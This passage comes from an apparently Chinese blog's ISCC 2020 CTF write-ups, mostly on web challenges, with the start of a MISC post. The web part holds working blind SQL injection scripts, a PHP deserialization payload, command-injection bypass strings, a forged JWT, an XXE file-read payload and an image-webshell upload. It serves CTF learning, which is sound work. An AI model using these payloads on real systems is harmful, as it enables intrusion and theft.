3,2</code>表示先以第三列排序，如果遇到第三列内容完全相同则再使用第二列进行相同行的排序。<br>而为了方便起见，这里只测试以第三列排序的：<br>payload</p><pre><code class="sql">select * from flag union select 1,2,&#39;c&#39; order by 3;</code></pre><p>当联合查询中第三列的字符如果小于等于真实的第三列密码字符则会页面会显示字符2，否则显示admin</p><pre><code class="sql">mysql&gt; select * from flag union select 1,2,&#39;a&#39; order by 3;+----+----------+----------------------------------+| Id | username | password                         |+----+----------+----------------------------------+|  1 | 2        | a                                ||  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |+----+----------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; select * from flag union select 1,2,&#39;b&#39; order by 3;+----+----------+----------------------------------+| Id | username | password                         |+----+----------+----------------------------------+|  1 | 2        | b                                ||  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |+----+----------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; select * from flag union select 1,2,&#39;c&#39; order by 3;+----+----------+----------------------------------+| Id | username | password                         |+----+----------+----------------------------------+|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 ||  1 | 2        | c                                |+----+----------+----------------------------------+2 rows in set (0.00 sec)</code></pre><p>于是通过对第三列进行排序可以判断第三列所存储的密码，其真实密码等于页面显示admin判定出来的每一个字符减1。<br>所以直接改一下脚本，跑脚本得到md5值，md5解密得到flag</p><pre><code class="py">import requestsurl = &quot;http://101.201.126.95:7006/&quot;alist = &quot;0123456789abcdef&quot;payload = &quot;&quot;payload1 = &quot;admin&#39; union select 1,2,&#39;&quot; #将&#39; or 1改成了admin&#39;payload2 = &quot;&#39; from admin order by 3 #&quot;datas = {&quot;username&quot;:&quot;&quot;,         &quot;password&quot;:&quot;&quot;     }tmp_OK = &quot;&quot;tmp = &quot;&quot;for j in range(0,32):    for i in alist:        payload = payload1+tmp_OK+i+payload2        datas[&quot;username&quot;] = payload        #print datas        r = requests.post(url=url,data=datas)        #print r.text        if &quot;admin&quot; in r.text: #将whaleadmin改成了admin            tmp_OK += tmp            print(tmp_OK)            break        if (&quot;2&quot; in r.text) and (i == &quot;f&quot;):            tmp_OK += i            print(tmp_OK)        tmp = i</code></pre><p><img src="http://img-blog.csdnimg.cn/20200511173821902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web5：Php-is-the-best-language"><a href="#Web5：Php-is-the-best-language" class="headerlink" title="Web5：Php is the best language"></a>Web5：Php is the best language</h3><p><strong>题目难度：简单</strong><br><strong>考察：PHP反序列化</strong><br>当时做的时候题目环境没问题。现在被大佬们搞崩了。也没截图，不过还好保存了源码，就本地搭个环境做一下好了。</p><pre><code class="php">&lt;?php  @error_reporting(1);include &#39;flag.php&#39;;class baby {    public $file;    function __toString()          {        if(isset($this-&gt;file))        {            $filename = &quot;./{$this-&gt;file}&quot;;            if (base64_encode(file_get_contents($filename)))            {                return base64_encode(file_get_contents($filename));            }        }    }}if (isset($_GET[&#39;data&#39;])){    $data = $_GET[&#39;data&#39;];        $good = unserialize($data);        echo $good;}else {    $url=&#39;./index.php&#39;;}$html=&#39;&#39;;if(isset($_POST[&#39;test&#39;])){    $s = $_POST[&#39;test&#39;];    $html.=&quot;&lt;p&gt;谢谢参与!&lt;/p&gt;&quot;;}?&gt;</code></pre><p>很明显，反序列化，构造exp</p><pre><code class="php">&lt;?phpclass baby {    public $file=&quot;flag.php&quot;;    function __toString()          {        if(isset($this-&gt;file))        {            $filename = &quot;./{$this-&gt;file}&quot;;            if (base64_encode(file_get_contents($filename)))            {                return base64_encode(file_get_contents($filename));            }        }    }}$test1=new baby;print_r(serialize($test1));?&gt;</code></pre><p>由exp生成payload:</p><pre><code class="php">O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>输入payload，然后Base64解码，得到flag</p><pre><code class="php">PD9waHAgJGE9J2ZsYWd7dV9yX3JlYWxseV9hX3BocF9leHBlcnR9Jzs/Pg0K</code></pre><h3 id="Web6：阿帅的爱情"><a href="#Web6：阿帅的爱情" class="headerlink" title="Web6：阿帅的爱情"></a>Web6：阿帅的爱情</h3><p><strong>题目难度：简单</strong><br><strong>考察：PHP代码审计+命令执行漏洞+绕过正则</strong></p><pre><code class="php">&lt;?phpif(!isset($_GET[&quot;ip&quot;])){    show_source(__file__);} else{    $ip=$_GET[&quot;ip&quot;];    $pattern=&quot;/[;|&amp;].*[a-zA-Z]+/&quot;;    if(preg_match($pattern,$ip)!=0){        die(&#39;bad domain&#39;);    }    try {        $result = shell_exec(&#39;ping -c 4 &#39; . $ip);    }    catch(Exception $e) {        $result = $e-&gt;getMessage();        echo $result;    }    $result = str_replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;, $result);    echo $result;}</code></pre><p>get传一个ip参数，然后对ip的参数值进行正则匹配。正则过滤命令执行的所有分隔符。<br>于是尝试绕过，找到有下面几种绕过方式：</p><pre><code class="php">%0acat%0Acat</code></pre><p>参考：<a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a><br>然后执行ls命令列出目录下的文件，发现flag.php。然后<code>cat flag.php</code>，下面其中一种方法的payload</p><pre><code class="shell">?ip=%0als?ip=%0acat flag.php或?ip=127.0.0.1%0als?ip=127.0.0.1%0acat flag.php</code></pre><p><img src="http://img-blog.csdnimg.cn/20200521220909965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200521221011603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web7：寻找小明-3"><a href="#Web7：寻找小明-3" class="headerlink" title="Web7：寻找小明-3"></a>Web7：寻找小明-3</h3><p>小明丢了。。。师傅们估计是盲猜出来的ip。</p><h3 id="Web8：神秘组织的邮件-2"><a href="#Web8：神秘组织的邮件-2" class="headerlink" title="Web8：神秘组织的邮件-2"></a>Web8：神秘组织的邮件-2</h3><p><strong>题目难度：普通</strong><br><strong>考察：计算题脚本编写</strong><br>打开题目链接<br><img src="http://img-blog.csdnimg.cn/20200517233956626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现5个数字，由神秘组织的邮件-1的<code>flag{加减乘除}</code>，想到应该是将上边五个数中间添加上“加减乘除”，并且需要在极短的时间内计算并提交结果，于是写脚本即可。同时做这道题发现了一道类似的脚本题：<a href="https://blog.csdn.net/Ruhe_king/article/details/82530056" target="_blank" rel="noopener">bugku 秋名山老司机 以及 hackinglab 快速口算</a><br>于是我写出这道题的加减乘除计算并提交结果的脚本(写完后，发现这个脚本并没有想象中的那么难)：</p><pre><code class="py">import reimport requestsurl=&quot;http://101.201.126.95:7010/&quot;headers={&quot;Cookie&quot;:&quot;PHPSESSID=e8iv7en9e33sqp6mi0j2c6ff7i&quot;}s=requests.Session()r=s.get(url,headers=headers)content=r.textcontent=re.sub(r&quot;&lt;/?(.+?)&gt;&quot;,&quot;&quot;,content)#去掉html标签content=re.sub(&#39;Result:&#39;,&#39;&#39;,content) #替换Result:为空content=content.strip() #去除字符串左右两端的空格和\t、\r、\nprint(content)num=content.split(&#39;  &#39;) #这里是空格当做列表分隔符print(num)#num = list(map(int, n))#将列表转换为int型#payload=num[0]+num[1]-num[2]*num[3]/num[4]payload=int(num[0])+int(num[1])-int(num[2])*int(num[3])/int(num[4])print(payload)data = {&quot;result&quot;:payload}r = s.post(url=url+&quot;result.php&quot;,headers=headers,data=data)print(r.text)</code></pre><p>顺带贴出我们团队的lemon写的脚本(有时候跑一次跑不出来结果，需要多跑几次，不晓得为啥)，用到了Python爬虫的解析库BeautifulSoup(Python爬虫我才学一点，还不太熟悉，所以我写脚本就没用它)</p><pre><code class="py">import reimport requestsfrom bs4 import BeautifulSoupurl=&quot;http://101.201.126.95:7010/&quot;headers={&quot;Cookie&quot;:&quot;PHPSESSID=e8iv7en9e33sqp6mi0j2c6ff7i&quot;}s=requests.Session()response=s.get(url,headers=headers)content=response.text#print(r)soup = BeautifulSoup(content,&#39;lxml&#39;)li_list = soup.find_all(text=re.compile(&#39;\d&#39;))result = [x.strip() for x in li_list if x.strip()!=&#39;&#39;]str = &quot;&quot;.join(result)a=str.split(&#39;  &#39;)numbers = list(map(int, a))print(numbers)payload =numbers[0]+numbers[1]-numbers[2]*numbers[3]/numbers[4]print(payload)data = {&#39;result&#39;: payload}reponse = requests.post(url=url+&quot;result.php&quot;,headers=headers,data=data).textprint(reponse)</code></pre><p>跑脚本，得到文件名(同时是测出来是安卓题<code>神秘组织的邮件-3</code>的压缩包密码)。<br><img src="http://img-blog.csdnimg.cn/2020051801343090.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>浏览器访问txt文件失败，使用python脚本访问成功</p><pre><code class="py">import requestsurl=&quot;http://101.201.126.95:7010/IS20CC20abc%$.txt&quot;r=requests.get(url).textprint(r)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200518014809451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现如果result解码后的结果等于flag.php，跳转到flag.php。我觉得整正常情况下直接在上边post传入result参数，且参数值是flag.php的Base64编码后的结果，即</p><pre><code class="py">import requestsurl=&quot;http://101.201.126.95:7010/result.php&quot;headers={&quot;Cookie&quot;:&quot;PHPSESSID=e8iv7en9e33sqp6mi0j2c6ff7i&quot;}data={&#39;result&#39;:&#39;ZmxhZy5waHA=&#39;}r=requests.post(url=url,headers=headers,data=data).textprint(r)</code></pre><p>然而题可能出的有点问题(仅代表个人观点)，直接访问flag.php就得到flag了2333333。。。。(还有个坑就是注意不要直接写脚本访问，可以使用burp抓包改包发包)。<br><img src="http://img-blog.csdnimg.cn/20200518020159805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如果题目是这样的话，直接尝试burp抓包访问flag.php不就好了(这应该就是传说中的另类的盲猜flag了?!)。不过按照上边正常的思路来可以得到<code>IS20CC20abc%$.txt</code>，而神秘组织的邮件-3的压缩包密码就是<code>IS20CC20abc%$</code>，还是有一点用处的。。。。</p><h3 id="Web9：未知的风险-2"><a href="#Web9：未知的风险-2" class="headerlink" title="Web9：未知的风险-2"></a>Web9：未知的风险-2</h3><p><strong>题目难度：较难</strong><br><strong>考察：File Vault</strong><br>原题改的，没搞出来。现在也无法复现，于是参考wp学习一下<br>可以参考：<br><a href="http://www.anquanke.com/post/id/206658" target="_blank" rel="noopener">ISCC 2020 Web WriteUp</a><br><a href="http://www.jianshu.com/p/972327151eff?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">insomnihack-teaser-2018/file-vault 学习</a><br><a href="http://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault" target="_blank" rel="noopener">Insomnihack Teaser 2018 / File Vault</a></p><h3 id="Web10：ISCC成绩查询-2"><a href="#Web10：ISCC成绩查询-2" class="headerlink" title="Web10：ISCC成绩查询-2"></a>Web10：ISCC成绩查询-2</h3><p><strong>题目难度：普通</strong><br><strong>考察：SQL时间盲注+过滤空格和<code>#</code></strong><br>看到题，先在用扫描工具扫一下，发现flag.php<br><img src="http://img-blog.csdnimg.cn/20200521222016851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后直接访问<code>http://101.201.126.95:7007/flag.php</code>发现直接跳转到index.php。于是使用burp进行抓包重放<br>发现是从pikachu靶场sql注入改的<br><img src="http://img-blog.csdnimg.cn/20200521222352180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并且需要get传参两个参数name和submit<br><img src="http://img-blog.csdnimg.cn/20200521222511955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后传参，无论怎么测试，就只显示一个页面(也就是所谓无回显)，于是考虑SQL时间盲注<br><img src="http://img-blog.csdnimg.cn/20200521222810298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先fuzz一下，发现过滤了空格和#，<code>空格</code>可用<code>/**/</code>代替，<code>#</code>可以用<code>%23</code>代替。<br>参考：<a href="http://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/#%E9%80%97%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA" target="_blank" rel="noopener">对MYSQL注入相关内容及部分Trick的归类小结</a><br>于是写出测试的基本语句，并测试：</p><pre><code class="sql">&#39;/**/or/**/if(1=1,sleep(3),1)%23</code></pre><p><img src="http://img-blog.csdnimg.cn/20200521223203799.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现果然响应比正常慢了很多，说明测试语句没问题。开始进行盲注，于是我写出解题脚本：</p><pre><code class="py">import requestsimport stringimport timeimport datetimeif __name__ == &quot;__main__&quot;:    chars=string.ascii_letters+string.digits    url=&quot;http://101.201.126.95:7007/flag.php&quot;    #payload=&quot;&#39;/**/or/**/if((ascii(substr(database(),{0},1))={1}),sleep(3),1)%23&quot; #pikachu    #payload=&quot;&#39;/**/or/**/if((ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),{0},1))={1}),sleep(3),1)%23&quot;#flag    #payload=&quot;&#39;/**/or/**/if((ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=\&quot;flag\&quot;/**/limit/**/0,1),{0},1))={1}),sleep(3),1)%23&quot;    payload=&quot;&#39;/**/or/**/if((ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/0,1),{0},1))={1}),sleep(3),1)%23&quot;    print(&quot;数据：&quot;)    name=&#39;&#39;    for i in range(1,40):        char=&#39;&#39;        for j in chars:            payloads=payload.format(i,ord(j))            urls=url+&quot;?name=&quot;+payloads+&quot;&amp;submit=%E6%9F%A5%E8%AF%A2&quot;            t1=datetime.datetime.now()            r=requests.get(url=urls)            t2=datetime.datetime.now()            sec = (t2 - t1).seconds            if sec&gt;=3:                name+=j                print(name)                char=j                break        if char==&#39;&#39;:            break</code></pre><p>依次跑上边的脚本，得到当前数据库名、数据表名、字段名和记录。<br><img src="http://img-blog.csdnimg.cn/20200521224102133.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现是md5加密后的，找一个在线的md5解密网站解密即可。<br>解密结果是<code>sixsixsix</code>，即是flag，加上flag{}提交即可。<br>看了一下<code>ISCC成绩查询-3</code>，很明显<code>666</code>是是线索，也就是key。于是顺带做出<code>ISCC成绩查询-3</code></p><h3 id="Web11：ISCC成绩查询-3："><a href="#Web11：ISCC成绩查询-3：" class="headerlink" title="Web11：ISCC成绩查询_3："></a>Web11：ISCC成绩查询_3：</h3><p><strong>题目难度：简单</strong><br><strong>考察：PHP可逆加密解密算法</strong><br>进入题目F12查看源码，发现以下代码：</p><pre><code class="php">&lt;?phpfunction encrypt($data, $key){    $key = md5($key);    $x  = 0;    $len = strlen($data);    $l  = strlen($key);    for ($i = 0; $i &lt; $len; $i++)    {        if ($x == $l)         {         $x = 0;        }        $char .= $key{$x};        $x++;    }    for ($i = 0; $i &lt; $len; $i++)    {        $str .= chr(ord($data{$i}) + (ord($char{$i})) % 256);    }    return base64_encode($str);}?&gt;</code></pre><p>百度一搜，发现是原题参考：<a href="http://blog.csdn.net/iteye_17658/article/details/82677761" target="_blank" rel="noopener">PHP 加密与解密</a>、<a href="http://www.iteye.com/blog/panyongzheng-1967038" target="_blank" rel="noopener">PHP加密解密代码</a><br>bugku上也有类似的，就变了一点的题，参考：<a href="http://www.cnblogs.com/xhds/p/12231833.html" target="_blank" rel="noopener">bugku-PHP_encrypt_1(ISCCCTF)</a><br>不过还是自己先审计一下代码的大致意思，自己写一下解密：</p><pre><code class="php">1.定义一个函数，接收data和key2.对传过来的key进行md5加密赋值给$key；令变量$x = 0；将传过来的data取长度赋值给$len；将传过来的key取长度赋值给$l3.然后来一个for循环，将md5加密后key进行截取和data长度一样，并存放在$char。4.然后再来一个for循环，让(原文每个字符+密钥对应每个字符)%256得到密文，赋值给$str5.对$str进行base64加密后，返回。</code></pre><p>于是考虑解密算法大致应该这样写：</p><pre><code class="php">1.先算出key的md5，即是密钥2.然后对data进行base64解码得到密文3.密文每个字符-密钥，如果&lt;0再加256；否则不用加4.最后返回最终结果</code></pre><p>于是写出对应(将题目中的字符串作为data，ISCC成绩查询_2得到的666作为key)解密的PHP脚本：</p><pre><code class="php">&lt;?phpfunction decrypt($data, $key){    $key = md5($key);    $x = 0;    $data = base64_decode($data);    $len = strlen($data);    $l = strlen($key);    for ($i = 0; $i &lt; $len; $i++){        if ($x == $l){            $x = 0;        }        $char .= substr($key, $x, 1);        $x++;    }    for ($i = 0; $i &lt; $len; $i++){        if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))){            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));        }else{            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));        }    }    return $str;}$data = &#39;qKe4j6uFeqaTe5rVqqaXiKig25o=&#39;; // 被加密信息$key = &#39;666&#39;; // 密钥$decrypt = decrypt($data, $key);echo $decrypt;?&gt;</code></pre><p>运行这段PHP代码，即可得到flag。<br><img src="http://img-blog.csdnimg.cn/2020052123153746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web12：What-can-images-do"><a href="#Web12：What-can-images-do" class="headerlink" title="Web12：What can images do"></a>Web12：What can images do</h3><p><strong>题目难度：简单</strong><br><strong>考察：文件上传+图片马</strong><br>当时做的时候没一点问题。总结的时候，发现又被某个”大佬”改了<br>上传文件目录的权限被改了，无法上传文件。<br>不过还好做的时候截图了。(最后比赛快结束时，题目又被修复了)<br>首先上传一个图片马<br><img src="http://img-blog.csdnimg.cn/20200511164849900.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后抓包，使用这个功能包含上传的图片马<br><img src="http://img-blog.csdnimg.cn/20200511165004869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后使用蚁剑连接，找到flag文件打开即可<br><img src="http://img-blog.csdnimg.cn/20200511165317813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200511165347779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web13：未知的风险-1"><a href="#Web13：未知的风险-1" class="headerlink" title="Web13：未知的风险-1"></a>Web13：未知的风险-1</h3><p><strong>题目难度：较难</strong><br><strong>考察：JWT绕过(破解key或设置加密为空)+xxe</strong><br>参考：<a href="https://www.cnblogs.com/hetianlab/p/12753770.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">从hfctf学习JWT伪造</a><br>总结时，发现题目依旧被大佬们搞崩了(然后又被修复好了)。这里就放上之前做的时候的截图吧。<br>设置加密为空，然后将原来的token使用<a href="http://jwt.io/" target="_blank" rel="noopener">jwt工具</a>构造payload<br><img src="http://img-blog.csdnimg.cn/20200511190922167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="php">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 .eyJpZCI6InVzZXIiLCJpYXQiOjE1ODgzMDk5MDEsImp0aSI6ImVjZWNlM2YyOTFmZmRiZDVjMmMxOTVkZmU2OGMyNGRiIn0.</code></pre><p>设置为token访问,发现username和password，设置username和password再次生成payload<br><img src="http://img-blog.csdnimg.cn/20200511191402607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="php">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6InVzZXIiLCJpYXQiOjE1ODgzMDk5MDEsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluMTIzIiwianRpIjoiZWNlY2UzZjI5MWZmZGJkNWMyYzE5NWRmZTY4YzI0ZGIifQ.</code></pre><p>访问，然后抓包，发现xml内容，并且和xxe的xxe-lab靶场很像。于是猜测使用xxe读取flag文件。<br>首先，先读取<code>/etc/passwd</code>测试一下，发现果然存在xxe漏洞。然后先读取<code>doLogin.php</code>Base64解码发现flag文件路径</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;php://filter/read=convert.base64-encode/resource=doLogin.php&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/2020051119190588.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后读取<code>flag.php</code>文件，再Base64解码得到flag<br><img src="http://img-blog.csdnimg.cn/20200511192035277.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>Web题整体难度并不太难。这些Web题我学到的新知识有：<br><code>过滤括号()的SQL盲注</code>、<code>计算题脚本编写</code>、<code>过滤空格和#的SQL时间盲注</code>、<code>PHP可逆加密解密算法</code>、<code>JWT伪造</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2020部分MISC总结</title>
      <link href="/2020/05/29/ISCC2020%E9%83%A8%E5%88%86MISC%E6%80%BB%E7%BB%93/"/>
      <url>/2020/05/29/ISCC2020%E9%83%A8%E5%88%86MISC%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次ISCC，不得不说杂项题脑洞真大(脑袋坑太少，就做出了几道)，并且没有Crypto题。但Web题目难度还行(不容易的题，主要是涉及脑洞)，由于擂台题的MISC题太难了，所以主要先总结一下练武题的MISC部分题。并且另起一篇总结Web题。</p><h3 id="MISC1：ISCC签到"><a href="#MISC1：ISCC签到" class="headerlink" title="MISC1：ISCC签到"></a>MISC1：ISCC签到</h3><p><strong>题目难度：简单</strong><br><strong>考察：图片高度+维吉尼亚密码</strong><br>在winhex里改图片高度，得到<br><img src="http://img-blog.csdnimg.cn/20200522002241798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后进行维吉尼亚密码解密，并且很容易想到密钥是<code>high</code></p><h3 id="MISC2：寻找小明-1"><a href="#MISC2：寻找小明-1" class="headerlink" title="MISC2：寻找小明-1"></a>MISC2：寻找小明-1</h3><p><strong>题目难度：普通</strong><br><strong>考察：Stegsolve+使用cv2库</strong></p><h4 id="cv2模块使用"><a href="#cv2模块使用" class="headerlink" title="cv2模块使用"></a>cv2模块使用</h4><p>参考：<br><a href="https://blog.csdn.net/RNG_uzi_/article/details/90034485" target="_blank" rel="noopener">CV2模块使用（详细教程）</a><br><a href="https://www.cnblogs.com/shizhengwen/p/8719062.html" target="_blank" rel="noopener">模块cv2的用法</a><br><a href="https://blog.csdn.net/li_huifei/article/details/78347654" target="_blank" rel="noopener">openCV库cv2的使用</a><br>首先使用Stegsolve查看不同颜色通道，发现在Red plane 0发现一张二维码<br><img src="http://img-blog.csdnimg.cn/20200522002934563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫描得到一串数字列表</p><pre><code class="py">[257,1,258,2,259,3,260,4,261,5,262,7,263,8,259,277,438,300,455,319,25,300,456,400,66,366,78,300,421,259,452,23]</code></pre><p>看到数字列表这种形式，一般考虑对图像进行操作。<br>然后将数字列表的数字，两个一组作为像素点，发现每个点的R颜色通道值的ASCII码就是flag。脑洞真的大。。。于是写出脚本</p><pre><code class="py">import cv2img=cv2.imread(&#39;zd.png&#39;)x=[257,258,259,260,261,262,263,259,438,455,25,456,66,78,421,452]y=[1,2,3,4,5,7,8,277,300,319,300,400,366,300,259,23]for i in range(16):    px = img[y[i], x[i]]    print(chr(px[2]),end=&quot;&quot;)</code></pre><p>跑脚本，得到flag<br><img src="http://img-blog.csdnimg.cn/20200522004311745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="MISC3：ISCC成绩查询-1"><a href="#MISC3：ISCC成绩查询-1" class="headerlink" title="MISC3：ISCC成绩查询-1"></a>MISC3：ISCC成绩查询-1</h3><p><strong>题目难度：普通</strong><br><strong>考察：Stegsolve+图论的哥尼斯堡七桥问题+栅栏密码</strong><br>使用Stegsolve打开test_ctf.png，查看不同颜色通道，发现一个路径图。看着不太清晰，于是找个脚本把图提取出来(也可以不用提取，直接在Stegsolve的Green plane 1通道看。下边的是我用脚本提取的)：<br><img src="http://img-blog.csdnimg.cn/20200522010048129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据群里师傅们的讨论，涉及图论。然后基本确定是一个哥尼斯堡七桥问题。观察到上图只有箭头所示的点是奇度数节点，所以是存在欧拉通路的半欧拉图。然后从两个奇度数点出发，找到符合图片顺序的欧拉通路。<br><img src="http://img-blog.csdnimg.cn/20200522011035202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接后为：TRLNCHHAFCIEEIEEPR<br>栅栏密码解密后为：THERAILFENCECIPHER<br>flag：flag{THERAILFENCECIPHER}</p><h3 id="MISC4：神秘组织的邮件-1"><a href="#MISC4：神秘组织的邮件-1" class="headerlink" title="MISC4：神秘组织的邮件-1"></a>MISC4：神秘组织的邮件-1</h3><p><strong>题目难度：普通</strong><br><strong>考察：脑洞</strong><br>暂时未搞懂咋做，看知乎师傅们的讨论，可以猜到flag，即<code>flag{加减乘除}</code></p><h3 id="MISC5：千层套路"><a href="#MISC5：千层套路" class="headerlink" title="MISC5：千层套路"></a>MISC5：千层套路</h3><p><strong>题目难度：普通</strong><br><strong>考察：抽帧+拼图+像素点画图+pdf隐藏文字</strong><br>题目是gif动态图，使用Stegsolve的Frame Browser进行抽帧，提取出来8张图片<br>然后进行拼图(在ppt里拼比较快些)，得到<br><img src="http://img-blog.csdnimg.cn/20200522012531258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后使用winrar打开<code>题目.gif</code>，发现压缩包(也可以用foremost分离出压缩包)，不过需要密码<br><img src="http://img-blog.csdnimg.cn/20200522012702576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而拼图得到的结果就是压缩包密码，输入密码，解压。打开1.txt<br><img 